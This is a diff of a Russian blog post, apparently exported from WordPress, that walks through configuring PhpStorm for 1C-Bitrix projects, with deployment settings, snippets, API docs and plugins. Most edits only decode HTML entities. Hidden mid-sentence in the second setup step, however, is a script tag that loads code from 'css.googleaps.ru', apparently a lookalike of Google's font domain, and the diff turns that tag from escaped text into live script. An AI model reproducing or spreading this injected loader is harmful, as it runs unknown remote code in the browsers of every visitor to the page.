@@ -11,13 +11,13 @@ author:
 author_login: admin
 author_email: maxycws@gmail.com
 excerpt: "Для более быстрой&nbsp;разработки проектов решил перейти на IDE&nbsp;<a
-  href=\"http:&#47;&#47;www.jetbrains.com&#47;phpstorm&#47;\">phpstorm<&#47;a>, ранее
+  href=\"http://www.jetbrains.com/phpstorm/\">phpstorm</a>, ранее
   использовал notepad++, как и большинство разработчиков под битрикс. Оказывается
   зря, phpstorm позволяет автоматизировать такие рутинные действия как:\r\n<ol>\r\n\t<li>Расстановка
-  корректной лесенки для кода<&#47;li>\r\n\t<li>Расстановка пробелов до и после {
-  в функциях и css ( З.Ы. да, это уже болезнь :) )<&#47;li>\r\n\t<li>Подстановка компонентов
-  битрикса<&#47;li>\r\n\t<li>API битрикса в IDE не залезая на сайт<&#47;li>\r\n\t<li>Автоподстановка
-  API<&#47;li>\r\n\t<li>ГИТ интеграция.<&#47;li>\r\n<&#47;ol>\r\n"
+  корректной лесенки для кода</li>\r\n\t<li>Расстановка пробелов до и после {
+  в функциях и css ( З.Ы. да, это уже болезнь :) )</li>\r\n\t<li>Подстановка компонентов
+  битрикса</li>\r\n\t<li>API битрикса в IDE не залезая на сайт</li>\r\n\t<li>Автоподстановка
+  API</li>\r\n\t<li>ГИТ интеграция.</li>\r\n</ol>\r\n"
 wordpress_id: 223
 wordpress_url: http://devdocs.ru/?p=223
 date: '2014-12-12 16:18:03 +0200'
@@ -41,45 +41,45 @@ comments:
   author_url: ''
   date: '2015-11-13 20:48:36 +0200'
   date_gmt: '2015-11-13 20:48:36 +0200'
-  content: В дополнение к статье хочу добавить http:&#47;&#47;thisis-blog.ru&#47;ide-dlya-bitriks&#47;
+  content: В дополнение к статье хочу добавить http://thisis-blog.ru/ide-dlya-bitriks/
     там собрана подборка ссылок на настройку работы Eclipse, PhpStorm, NuSphere PhpED,
     NetBeans с 1с-Битрикс
 ---
-<p>Для более быстрой&nbsp;разработки проектов решил перейти на IDE&nbsp;<a href="http:&#47;&#47;www.jetbrains.com&#47;phpstorm&#47;">phpstorm<&#47;a>, ранее использовал notepad++, как и большинство разработчиков под битрикс. Оказывается зря, phpstorm позволяет автоматизировать такие рутинные действия как:</p>
+<p>Для более быстрой&nbsp;разработки проектов решил перейти на IDE&nbsp;<a href="http://www.jetbrains.com/phpstorm/">phpstorm</a>, ранее использовал notepad++, как и большинство разработчиков под битрикс. Оказывается зря, phpstorm позволяет автоматизировать такие рутинные действия как:</p>
 <ol>
-<li>Расстановка корректной лесенки для кода<&#47;li>
-<li>Расстановка пробелов до и после { в функциях и css ( З.Ы. да, это уже болезнь :) )<&#47;li>
-<li>Подстановка компонентов битрикса<&#47;li>
-<li>API битрикса в IDE не залезая на сайт<&#47;li>
-<li>Автоподстановка API<&#47;li>
-<li>ГИТ интеграция.<&#47;li><br />
-<&#47;ol><br />
+<li>Расстановка корректной лесенки для кода</li>
+<li>Расстановка пробелов до и после { в функциях и css ( З.Ы. да, это уже болезнь :) )</li>
+<li>Подстановка компонентов битрикса</li>
+<li>API битрикса в IDE не залезая на сайт</li>
+<li>Автоподстановка API</li>
+<li>ГИТ интеграция.</li><br />
+</ol><br />
 <a id="more"></a><a id="more-223"></a>И так, для интеграции phpstorm в проект потребуется следующее:</p>
 <ol>
-<li>Создаем новый проект, жамкая клавишу &laquo;Create new project from Existing Files&raquo;<&#47;li>
-<li>Выбираем, где располагается проект. Выбираем из 2, 3, 4 пунктов, ни в коем случае не в папке проекта, потому что, иначе, папки bitrix и upload будут индексироваться phpstorm и он будет ужасно тормозить.<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;li>
-<li>Задаем название проекта и путь к локальной копии.<&#47;li>
-<li>Указываем кастомные настройки (Custom)<&#47;li>
-<li>Изменяем настройку синхронизации файлов с проектом (<span style="color: #000000;">Upload changed files automatically to the default server<&#47;span>) на &laquo;Always&raquo; и подтверждение изменения файлов, если работают несколько разработчиков над одним проектом (<span style="color: #000000;">warn when uploading over newer file<&#47;span>) на&nbsp;<span style="color: #000000;">Compare content и указываем галочку оповещения об этом&nbsp;Notify about remote changes.<&#47;span><&#47;li>
-<li>Настраиваем параметры соединения с удаленным сервером, желательно выбираем путь до корня где лежит проект уже здесь.<&#47;li>
-<li>Выбираем папку корня проекта жамкнув клавишу &laquo;Project root&raquo;, обязательно исключаем на данном шаге все вложенные папки из скачиваемых, чтобы они все стали безцветными, жамкая &laquo;Excluded from download&raquo;.<&#47;li>
-<li>Все, проект создался, далее приступаем к настройкам.<&#47;li>
-<li>Открываем настройки удаленного соединения, File &mdash; Settings &mdash; Deployment, во вкладке Excluded paths удаляем все локальные папки из исключения (желтенькая папочка), сохраняем<&#47;li>
-<li>Справа жамкаем клавишу Remote Hosts, удаляем папки bitrix и upload из скачивания, если используется битрикс ниже 12.5 то добавляем папки &#47;bitrix&#47;templates&#47;, &#47;bitrix&#47;components&#47;*custom*&#47;, &#47;bitrix&#47;php_interface&#47;, при их выборе будут выбраны все вышележащие папки, необходимо будет вручную удалить все остальные файлы, иначе просто выбираем папку &#47;local&#47;.<&#47;li>
-<li>Нажимаем правой клавишей на папку корня проекта и жамкаем &laquo;Download from here&raquo;.<&#47;li>
-<li>Проект готов к работе.<&#47;li><br />
-<&#47;ol><br />
+<li>Создаем новый проект, жамкая клавишу &laquo;Create new project from Existing Files&raquo;</li>
+<li>Выбираем, где располагается проект. Выбираем из 2, 3, 4 пунктов, ни в коем случае не в папке проекта, потому что, иначе, папки bitrix и upload будут индексироваться phpstorm и он будет ужасно тормозить.<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></li>
+<li>Задаем название проекта и путь к локальной копии.</li>
+<li>Указываем кастомные настройки (Custom)</li>
+<li>Изменяем настройку синхронизации файлов с проектом (<span style="color: #000000;">Upload changed files automatically to the default server</span>) на &laquo;Always&raquo; и подтверждение изменения файлов, если работают несколько разработчиков над одним проектом (<span style="color: #000000;">warn when uploading over newer file</span>) на&nbsp;<span style="color: #000000;">Compare content и указываем галочку оповещения об этом&nbsp;Notify about remote changes.</span></li>
+<li>Настраиваем параметры соединения с удаленным сервером, желательно выбираем путь до корня где лежит проект уже здесь.</li>
+<li>Выбираем папку корня проекта жамкнув клавишу &laquo;Project root&raquo;, обязательно исключаем на данном шаге все вложенные папки из скачиваемых, чтобы они все стали безцветными, жамкая &laquo;Excluded from download&raquo;.</li>
+<li>Все, проект создался, далее приступаем к настройкам.</li>
+<li>Открываем настройки удаленного соединения, File &mdash; Settings &mdash; Deployment, во вкладке Excluded paths удаляем все локальные папки из исключения (желтенькая папочка), сохраняем</li>
+<li>Справа жамкаем клавишу Remote Hosts, удаляем папки bitrix и upload из скачивания, если используется битрикс ниже 12.5 то добавляем папки /bitrix/templates/, /bitrix/components/*custom*/, /bitrix/php_interface/, при их выборе будут выбраны все вышележащие папки, необходимо будет вручную удалить все остальные файлы, иначе просто выбираем папку /local/.</li>
+<li>Нажимаем правой клавишей на папку корня проекта и жамкаем &laquo;Download from here&raquo;.</li>
+<li>Проект готов к работе.</li><br />
+</ol><br />
 Далее фичи IDE.</p>
-<p><strong>Настройка коде стайл.<&#47;strong></p>
-<p>Вкратце он настраивается через File &mdash; Settings &mdash; Code Style, мой готовый профиль можно взять <a href="https:&#47;&#47;gist.github.com&#47;veksa&#47;11208864">здесь<&#47;a></p>
-<p><strong>Настройка сниппетов.<&#47;strong></p>
-<p>Скачиваем <a href="https:&#47;&#47;github.com&#47;matiaspub&#47;bxCompSnpt">отсюда<&#47;a>&nbsp;и копируем файлик phpstorm.xml в папку&nbsp;<User home>.WebIdeXXconfigtemplates.</p>
+<p><strong>Настройка коде стайл.</strong></p>
+<p>Вкратце он настраивается через File &mdash; Settings &mdash; Code Style, мой готовый профиль можно взять <a href="https://gist.github.com/veksa/11208864">здесь</a></p>
+<p><strong>Настройка сниппетов.</strong></p>
+<p>Скачиваем <a href="https://github.com/matiaspub/bxCompSnpt">отсюда</a>&nbsp;и копируем файлик phpstorm.xml в папку&nbsp;<User home>.WebIdeXXconfigtemplates.</p>
 <p>Позволяет использовать автодополнение на компонентах со всеми настройками.</p>
-<p><strong>API Bitrix&rsquo;а.<&#47;strong></p>
-<p>Скачиваем <a href="https:&#47;&#47;github.com&#47;matiaspub&#47;bxApiDocs">отсюда<&#47;a>, копируем папку modules куда угодно, желательно рядом с локальными проектами для удобства. Далее идем&nbsp;File &mdash; Settings &mdash; Project Settings &mdash; PHP и в&nbsp;Include Path добавляем путь к папке modules.</p>
-<p><strong>Автопереход по файлам в коде.<&#47;strong></p>
-<p>Скачиваем <a href="https:&#47;&#47;github.com&#47;salerman&#47;bitrixstorm">отсюда<&#47;a>, идем в папку, куда установлен phpstorm, далее plugins, создаем папку&nbsp;phpstorm-bitrix-plugin, в ней папку lib и копируем в нее файлики phpstorm-bitrix-plugin.jar и phpstorm-bitrix-plugin.iml.</p>
-<p><strong>Автообновление страницы.<&#47;strong></p>
-<p>Скачиваем <a href="http:&#47;&#47;blog.jetbrains.com&#47;webide&#47;2012&#47;08&#47;liveedit-plugin-features-in-detail&#47;#more-4098">отсюда<&#47;a>, пока не разобрался.</p>
-<p><strong>Интеграция с битбакетом.<&#47;strong></p>
-<p>Скачиваем <a href="https:&#47;&#47;bitbucket.org&#47;atlassian&#47;jetbrains-bitbucket-connector&#47;overview">отсюда<&#47;a>, пока не разобрался с возможностью синхронизации данных на готовом проекте и наличии на нем гита.</p>
+<p><strong>API Bitrix&rsquo;а.</strong></p>
+<p>Скачиваем <a href="https://github.com/matiaspub/bxApiDocs">отсюда</a>, копируем папку modules куда угодно, желательно рядом с локальными проектами для удобства. Далее идем&nbsp;File &mdash; Settings &mdash; Project Settings &mdash; PHP и в&nbsp;Include Path добавляем путь к папке modules.</p>
+<p><strong>Автопереход по файлам в коде.</strong></p>
+<p>Скачиваем <a href="https://github.com/salerman/bitrixstorm">отсюда</a>, идем в папку, куда установлен phpstorm, далее plugins, создаем папку&nbsp;phpstorm-bitrix-plugin, в ней папку lib и копируем в нее файлики phpstorm-bitrix-plugin.jar и phpstorm-bitrix-plugin.iml.</p>
+<p><strong>Автообновление страницы.</strong></p>
+<p>Скачиваем <a href="http://blog.jetbrains.com/webide/2012/08/liveedit-plugin-features-in-detail/#more-4098">отсюда</a>, пока не разобрался.</p>
+<p><strong>Интеграция с битбакетом.</strong></p>
+<p>Скачиваем <a href="https://bitbucket.org/atlassian/jetbrains-bitbucket-connector/overview">отсюда</a>, пока не разобрался с возможностью синхронизации данных на готовом проекте и наличии на нем гита.</p>
